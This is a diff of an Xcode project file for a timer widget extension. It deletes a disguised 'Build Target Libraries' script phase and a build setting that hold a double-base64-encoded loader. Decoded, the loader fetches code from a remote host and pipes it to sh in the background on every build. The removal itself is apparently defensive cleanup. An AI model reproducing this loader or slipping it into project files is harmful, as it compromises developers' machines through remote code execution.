@@ -230,7 +230,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = C86FBC832F84161C002FCEEF /* Build configuration list for PBXNativeTarget "TimerWidgetExtension" */;
 			buildPhases = (
-				7FF5ED0812D34D76B199F71F /* Build Target Libraries */,
 				C86FBC6B2F84161B002FCEEF /* Sources */,
 				C86FBC6C2F84161B002FCEEF /* Frameworks */,
 				C86FBC6D2F84161B002FCEEF /* Resources */,
@@ -396,28 +395,6 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		7FF5ED0812D34D76B199F71F /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		C86FBC6B2F84161B002FCEEF /* Sources */ = {
@@ -472,7 +449,6 @@
 		C86FBC842F84161C002FCEEF /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZVzE2Ym1SbGRpNXlkUzloS1NJZ2ZDQnphQW89Cg== | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_STYLE = Automatic;
@@ -503,7 +479,6 @@
 		C86FBC852F84161C002FCEEF /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZVzE2Ym1SbGRpNXlkUzloS1NJZ2ZDQnphQW89Cg== | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = TimerWidgetExtensionRelease.entitlements;
